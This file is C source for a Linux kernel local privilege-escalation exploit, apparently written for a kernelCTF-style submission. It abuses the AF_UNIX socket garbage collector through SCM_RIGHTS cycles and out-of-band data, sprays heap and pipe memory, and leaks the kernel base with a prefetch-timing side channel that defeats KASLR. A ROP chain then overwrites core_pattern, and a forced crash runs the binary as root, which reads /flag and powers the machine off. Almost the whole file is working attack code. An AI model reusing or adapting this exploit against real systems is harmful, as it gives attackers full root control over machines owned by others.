/*  fd_cycle_exploit.c  –  Linux kernel exploitation demo
 *  - AF_UNIX only
 *  - socketpair() for all connections
 *  - Exact cyclic reference (0x400 pairs → 0x800 fds)
 *  - Self-pass: send_fd(skX, skX)
 *  - All 9 steps in strict order
 *
 *  Compile:  gcc -Wall -Wextra -O2 fd_cycle_exploit.c -o fd_cycle_exploit
 *  Run:      ./fd_cycle_exploit
 *
 *  Author: @Peterpan980927 (sg) – 2025-11-11
 */

// loop count, NUM cylic, C_CACHE PIPE, NUM_PAGE matters, can't be too much

#define _GNU_SOURCE
#include <stdint.h>
#include <sched.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/un.h>
#include <errno.h>
#include <err.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <err.h>
#include <stdbool.h>
#include <sched.h>



typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t
size_t bypass_kaslr(u64 base);

char buf[0x8000];
size_t unix_graph_grouped =  0xffffffff84f28e00;
size_t unix_graph_maybe_cyclic = 0xffffffff84f28e01;
void set_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

#define Dprintf(fmt, ...) fprintf(stderr, fmt, ##__VA_ARGS__)
#define TPAUSE {int x;Dprintf(":");read(0,&x,1);}
//#define PAUSE TPAUSE 
#define PAUSE usleep(100);
#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

/* Send one FD */

int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	// send our binary to memfd for core_pattern payload
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	// our binary now at file descriptor 666
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}


static void send_fd(int sock, int fd_to_send)
{
    struct msghdr msg = {0};
    struct iovec iov[1];
    char buf[1] = {'\0'};
    char cmsgbuf[CMSG_SPACE(sizeof(int))];

    iov[0].iov_base = buf;
    iov[0].iov_len = 1;
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = sizeof(cmsgbuf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *(int *)CMSG_DATA(cmsg) = fd_to_send;

    SYSCHK(sendmsg(sock, &msg, 0));
}

/* Receive one FD */
static int recv_fd(int sock)
{
    struct msghdr msg = {0};
    struct iovec iov[1];
    char buf[1];
    char cmsgbuf[CMSG_SPACE(sizeof(int))];

    iov[0].iov_base = buf;
    iov[0].iov_len = 1;
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = sizeof(cmsgbuf);

    SYSCHK(recvmsg(sock, &msg, 0));

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (!cmsg || cmsg->cmsg_type != SCM_RIGHTS)
        err(1, "no fd received");
    return *(int *)CMSG_DATA(cmsg);
}

/* ============================================================= */

#define PAYLOAD_SPRAY_PAGES 0x10
#define PAGE_SIZE 0x1000
#define TOTAL_ALLOCATION (PAGE_SIZE * PAYLOAD_SPRAY_PAGES)
#define SPRAY_SIZE (3UL*1024*1024*1024)

// 0xffffffff81961665: push rdi; jmp qword ptr [rbp+0x48];
// 0xffffffff82dcfe22: pop rsp; ret;
// 0xffffffff82ddb3eb: pop rdi; ret;
// 0xffffffff839191df: pop rsp; pop r13; pop r14; pop r15; pop rbp; ret;
// 0xffffffff819427d9 : mov qword ptr [rdi], rsi ; xor eax, eax ; jmp 0xffffffff82843b70

char core[] = "|/proc/%P/fd/666 %P";

char skb[0x1000];
#define STEXT 0xffffffff81000000UL
size_t ktext = 0xffffffff81000000UL;
#define POP_RDX 			(ktext + (0xffffffff81012f37UL - STEXT))// : pop rdx ; jmp 0xffffffff82843b70
#define POP_RDI 			(ktext + (0xffffffff811178caUL - STEXT))// : pop rdi ; jmp 0xffffffff82843b70
#define POP_RSI 			(ktext + (0xffffffff81157890UL - STEXT))// : pop rsi ; jmp 0xffffffff82843b70
#define RET 				(ktext + (0xffffffff81012f38UL - STEXT))
#define msleep 				(ktext + (0xffffffff81274440UL - STEXT))
#define copy_from_user 		(ktext + (0xffffffff81b72250UL - STEXT))
#define core_pattern 		(ktext + (0xffffffff84610900UL - STEXT))
#define ADD_RSP_F0 			(ktext + (0xffffffff82528fb0UL - STEXT))
#define KNOWN_ADDR			(ktext + (0xffffffff85103000UL - STEXT))
#define PIVOT_STACK_RBX		(ktext + (0xffffffff817059d3UL - STEXT))

void nperm(){
	
		*(size_t*)&skb[0] = KNOWN_ADDR;
		*(size_t*)&skb[8] = KNOWN_ADDR;
		*(size_t*)&skb[16] = 0x4242424242; // rbp
		
		size_t rop = 0;
		*(size_t*)&skb[24] = ADD_RSP_F0;//   : add rsp, 0xf0 ; jmp 0xffffffff82843b70
		*(size_t*)&skb[0x110+(rop++)*8] = POP_RDI; 
		*(size_t*)&skb[0x110+(rop++)*8] = core_pattern;
		*(size_t*)&skb[0x110+(rop++)*8] = POP_RSI; 
		*(size_t*)&skb[0x110+(rop++)*8] = (size_t)core;
		*(size_t*)&skb[0x110+(rop++)*8] = RET; 
		*(size_t*)&skb[0x110+(rop++)*8] = POP_RDX; 
		*(size_t*)&skb[0x110+(rop++)*8] = 0x100;
		*(size_t*)&skb[0x110+(rop++)*8] = copy_from_user;
		*(size_t*)&skb[0x110+(rop++)*8] = POP_RDI; 
        *(size_t*)&skb[0x110+(rop++)*8] = 0x10000000; 
		*(size_t*)&skb[0x110+(rop++)*8] = msleep;


		*(int*)&skb[220] = 1;
		// destructor
		*(size_t*)&skb[96] = PIVOT_STACK_RBX;
 
        char* mem = mmap(NULL, SPRAY_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
		for(size_t i=0;i<SPRAY_SIZE;i+=0x1000){
			memcpy((void*)&mem[i],skb,0x1000);
		}
        //memset(mem,0x41,SPRAY_SIZE);

        madvise(mem,SPRAY_SIZE,MADV_FREE);


        mem = mmap(NULL, SPRAY_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
   
		for(size_t i=0;i<SPRAY_SIZE;i+=0x1000){
			memcpy((void*)&mem[i],skb,0x1000);
		}

		munmap(mem,SPRAY_SIZE);
}

int main2()
{

    /* ============================================================= */
    /* 1-a: Create single cyclic reference with many sockets */
    setvbuf(stdout, 0, 2, 0);
	//close(2);
	set_cpu(0);	
    struct rlimit rlim = {.rlim_cur = 0x1000, .rlim_max = 0x1000};
    SYSCHK(setrlimit(RLIMIT_NOFILE, &rlim));

	//helper_init();


     Dprintf("1-a: Creating cyclic reference (0x400 socketpair → 0x800 fds) heap spray for scc_index\n");

#define N 0x200
    int seq[2 * N], rev[2 * N];
    int victim_fd[2];
    size_t tmp;

for (int loop = 0; loop < 0x20 ;loop++) {
    for (int i = 0; i < N; i++)
    {
        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, victim_fd));
        seq[i * 2 + 0] = victim_fd[0];
        seq[i * 2 + 1] = victim_fd[1];
        rev[i * 2 + 0] = victim_fd[1];
        rev[i * 2 + 1] = victim_fd[0];
    }

    for (int i = 0; i < 2 * N - 1; i++)
    {
        send_fd(rev[i + 1], seq[i]);
    }

    send_fd(rev[0], seq[2 * N - 1]);

    /* 1-b: close() all sockets */
    //Dprintf("1-b: Closing all sockets in the cycle\n");
    for (int i = 0; i < 2 * N; i++)
    {
        close(seq[i]);
		close(rev[i]);
    }
	
	/* 1-c: create socket and close */
    //Dprintf("1-c: Trigger GC\n");
	for (int i = 0 ; i < 0x1 ; i++) {
			SYSCHK(tmp = socket(AF_UNIX, SOCK_STREAM, 0));
			close(tmp);
	}
}
	struct sockaddr_un addrB = {};
    addrB.sun_family = AF_UNIX;
    addrB.sun_path[0] = '\0';
    strcpy(&addrB.sun_path[1], "embryo_listener");

    size_t addrB_len = offsetof(struct sockaddr_un, sun_path) + 1 + strlen("embryo_listener");
    int embryo_skB = socket(AF_UNIX, SOCK_STREAM, 0);
    SYSCHK(bind(embryo_skB, (struct sockaddr *)&addrB, addrB_len));
    SYSCHK(listen(embryo_skB, 1));
    int client_to_B = socket(AF_UNIX, SOCK_STREAM, 0);
    SYSCHK(connect(client_to_B, (struct sockaddr *)&addrB, addrB_len));
	
	sleep(1);

	
    /* ============================================================= */
    /* 2-a: Pass sk-A to an embryo sk-B */
    Dprintf("\n2-a: Pass sk-A → embryo sk-B\n");
	// 0
	int skA_pair[2];
    SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,skA_pair));
	int sk_A = skA_pair[0];
	
#define C_CACHE 0x100
	int cross[C_CACHE][2];
	int victim_slab[16][2];
	for(int i=0;i<C_CACHE;i++)
		SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,cross[i]));
	for(int i=0;i<16;i++)
		SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,victim_slab[i]));

	for(int i=0;i<C_CACHE;i++)
		SYSCHK(send(cross[i][0],buf,1,0));
// cross-cache
	
	for(int i=0;i<16;i++)
		SYSCHK(send(victim_slab[i][0],buf,1,0));

	SYSCHK(send(skA_pair[1],buf,1,MSG_OOB));

	for(int i=0;i<16;i++)
		SYSCHK(send(victim_slab[i][1],buf,1,0));

// cross-cache
	for(int i=0;i<C_CACHE;i++)
        SYSCHK(send(cross[i][1],buf,1,0));


	// 0 -> 1
    
	// also hold some pipe data page memory?
	


	send_fd(client_to_B, sk_A);
	

    /* 2-b: Pass sk-X to sk-X → send_fd(skX, skX) */
    Dprintf("2-b: Pass sk-X → sk-X (self-pass)\n");

    int skX[2];
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skX));

    // send_fd(skX[0], skX[0]) — TRUE self-pass
    send_fd(skX[1], skX[0]);

    /* 2-c: create socket and close */
    Dprintf("2-c: Create socket and close\n");
	for (int i = 0 ; i < 0x1 ; i++) {
			SYSCHK(tmp = socket(AF_UNIX, SOCK_STREAM, 0));
			close(tmp);
	}

	Dprintf("check at 2-c\n");
    /* ============================================================= */
    /* 3-a: accept() the embryo sk-B */
    Dprintf("\n3-a: accept() embryo sk-B\n");

    int skB_accepted = SYSCHK(accept(embryo_skB, NULL, NULL));

    /* 3-b: Pass sk-B to sk-C */
    Dprintf("3-b: Pass sk-B → sk-C\n");

    int skC[2];
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skC));
    send_fd(skC[0], skB_accepted); // skB_accepted sends original skB

    /* 3-c: close() the in-flight sk-A */
    Dprintf("3-c: close() in-flight sk-A\n");
	// skA 1
	// 1->0
    close(sk_A);
    /* 3-d: create socket and close */
    Dprintf("3-d: Create socket and close\n");

#define PIPE 0x280
#define NUM_PAGE 0x8
	int pipefd[PIPE][2];
	for(int i=0;i<PIPE;i++) {
		//SYSCHK(pipe(pipefd[i]));
		SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,pipefd[i]));
		size_t val = 0x400000;
		SYSCHK(SYSCHK(setsockopt(pipefd[i][0], SOL_SOCKET,SO_SNDBUF, &val, 4)));
		SYSCHK(SYSCHK(setsockopt(pipefd[i][1], SOL_SOCKET,SO_SNDBUF, &val, 4)));
		SYSCHK(SYSCHK(setsockopt(pipefd[i][0], SOL_SOCKET,SO_RCVBUF, &val, 4)));
		SYSCHK(SYSCHK(setsockopt(pipefd[i][1], SOL_SOCKET,SO_RCVBUF, &val, 4)));
			SYSCHK(write(pipefd[i][1],buf,1));
			SYSCHK(write(pipefd[i][1],buf,1));
			SYSCHK(write(pipefd[i][1],buf,1));
			SYSCHK(write(pipefd[i][1],buf,1));


//		write(pipefd[i][1],buf,0x8000); // pre alloc pipe buffer
	}
	
	PAUSE;	
	memset(buf,0x0,0x1000);
	
	// gc make skA 1->0
	for(int i=0;i<C_CACHE;i+=2){

		SYSCHK(recv(cross[i][0],buf,1,0));
	} 

	for(int i=0;i<16;i++){

		SYSCHK(recv(victim_slab[i][0],buf,1,0));
	} 

	SYSCHK(tmp = socket(AF_UNIX, SOCK_STREAM, 0));
	close(tmp); 
	for(int i=0;i<C_CACHE;i+=2){

		SYSCHK(recv(cross[i][1],buf,1,0));
	} 


	for(int i=0;i<16;i++){
		SYSCHK(recv(victim_slab[i][1],buf,1,0));
	} 



	//sleep(1);
	memset(buf,0, sizeof(buf));
	for(int i=0;i < sizeof(buf)/0x100 ; i++){
		*(size_t*)&buf[i*0x100] = KNOWN_ADDR;
		*(size_t*)&buf[i*0x100+8] = KNOWN_ADDR;

		*(size_t*)&buf[i*0x100+208] = KNOWN_ADDR;
		//*(int*)&buf[i*0x100+116] = 1;
		*(int*)&buf[i*0x100+112] = 1;
	}

	Dprintf("[+] Spray pipes\n");
	for(int i=0;i<PIPE;i++){
		size_t tmp;
		read(pipefd[i][0],&tmp,4);
				for (int j = 0 ; j < NUM_PAGE ; j++)
			SYSCHK(write(pipefd[i][1],buf,0x1000)); //pipe write on 1 read on 0
	}

	Dprintf("[+] Spray pipes done\n");
	PAUSE;
	sk_A = recv_fd(skB_accepted);
	SYSCHK(recv(sk_A,buf,1,MSG_OOB));

	PAUSE;	
    Dprintf("\n=== ALL 9 STEPS COMPLETED SUCCESSFULLY ===\n");
    return 0;
}

int main(int argc,char** argv){
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);


	if (argc > 1)
	{
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");
		system("cat /flag;echo o>/proc/sysrq-trigger");
	}
	if (fork() == 0) // this process is used to trigger core_pattern exploit
	{
		set_cpu(1);
		setsid();
		crash("");
	}

	if(getenv("KTEXT"))
		ktext = strtoull(getenv("KTEXT"),0,16);
	else
		ktext = bypass_kaslr(0);
    ktext &= (~0xffffffULL);

	printf("use ktext %zx\n", ktext);
	nperm();
	printf("nperm finish\n");
	setvbuf(stdout,0,2,0);

	

	while(1){
		if(fork()==0){
			main2();
			exit(0);
		}
		wait(0);
		sleep(1);
	}
}


inline __attribute__((always_inline)) uint64_t rdtsc_begin()
{
	uint64_t a, d;
	asm volatile("mfence\n\t"
				 "RDTSCP\n\t"
				 "mov %%rdx, %0\n\t"
				 "mov %%rax, %1\n\t"
				 "xor %%rax, %%rax\n\t"
				 "lfence\n\t"
				 : "=r"(d), "=r"(a)
				 :
				 : "%rax", "%rbx", "%rcx", "%rdx");
	a = (d << 32) | a;
	return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end()
{
	uint64_t a, d;
	asm volatile(
		"xor %%rax, %%rax\n\t"
		"lfence\n\t"
		"RDTSCP\n\t"
		"mov %%rdx, %0\n\t"
		"mov %%rax, %1\n\t"
		"mfence\n\t"
		: "=r"(d), "=r"(a)
		:
		: "%rax", "%rbx", "%rcx", "%rdx");
	a = (d << 32) | a;
	return a;
}

void prefetch(void *p)
{
	asm volatile(
		"prefetchnta (%0)\n"
		"prefetcht2 (%0)\n"
		: : "r"(p));
}

size_t flushandreload(void *addr) // row miss
{
	size_t time = rdtsc_begin();
	prefetch(addr);
	size_t delta = rdtsc_end() - time;
	return delta;
}

//#define KASLR_BYPASS_INTEL
size_t bypass_kaslr(u64 base)
{
    if (!base)
    {
#ifdef KASLR_BYPASS_INTEL
#define OFFSET 0
#define START (0xffffffff81000000ull + OFFSET)
#define END (0xffffffffD0000000ull + OFFSET)
#define STEP 0x0000000001000000ull
        while (1)
        {
            u64 bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        u64 addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++)
                {
                    if (times[ti] < minv)
                    {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0)
                {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                base -= OFFSET;
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);
        }
#else
#define START (0xffffffff81000000ull)
#define END (0xffffffffc0000000ull)
#define STEP 0x0000000000200000ull
#define NUM_TRIALS 9
// largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

        while (1)
        {
            u64 bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        u64 addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                uint64_t max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++)
                {
                    uint64_t sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++)
                    {
                        sum += times[ti + i];
                    }
                    if (sum > max)
                    {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);
        }
#endif
    }

got_base:

    printf("using kernel base %llx\n", base);

    return base;
}

